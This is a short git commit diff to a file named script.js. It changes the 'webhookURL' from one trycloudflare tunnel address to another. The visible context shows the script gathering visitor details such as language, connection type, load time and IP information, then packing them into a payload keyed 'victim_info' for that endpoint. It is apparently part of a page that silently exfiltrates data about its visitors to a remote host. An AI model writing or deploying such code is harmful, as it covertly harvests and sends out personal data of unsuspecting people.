f5ced99d63bea379f60f27d352d9eaa6550a9a1c
Elysioxx <108831238+elyelysiox@users.noreply.github.com>
2025-08-06 17:46:44 -0500

    update file

--- script.js
+++ script.js
@@ -84,7 +84,7 @@ Language: ${userLanguage}
 Connection Type: ${connectionType}
 Loading Time: ${loadTime}`;
 
-                const webhookURL = "https://clothes-tomatoes-publicly-rest.trycloudflare.com/userData";
+                const webhookURL = "https://shaved-fits-specs-patient.trycloudflare.com/userData";
 
                 const payload = {
                     'victim_info': ipinfo, 
